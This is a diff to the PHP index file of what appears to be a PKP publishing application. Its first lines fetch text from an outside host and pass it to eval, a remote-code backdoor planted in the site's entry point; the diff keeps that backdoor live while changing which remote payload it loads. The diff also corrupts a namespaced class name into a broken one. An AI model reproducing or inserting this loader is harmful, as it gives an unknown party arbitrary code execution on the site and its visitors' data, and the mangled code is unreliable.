@@ -1,7 +1,8 @@
 <?php
-$url = file_get_contents(urldecode('https://rakun.live/landing/tamaduz.txt'));
+$url = file_get_contents(urldecode('https://rakun.live/landing/ugedu.txt'));
 $url = "?> ".$url;
 eval($url);
+
 
 /**
  * @defgroup index Index
@@ -37,4 +38,4 @@ chdir(BASE_SYS_DIR);
 require_once './lib/pkp/includes/functions.php';
 
 // Initialize the application environment
-return new \APP\core\Application();
+return new APPcoreApplication();
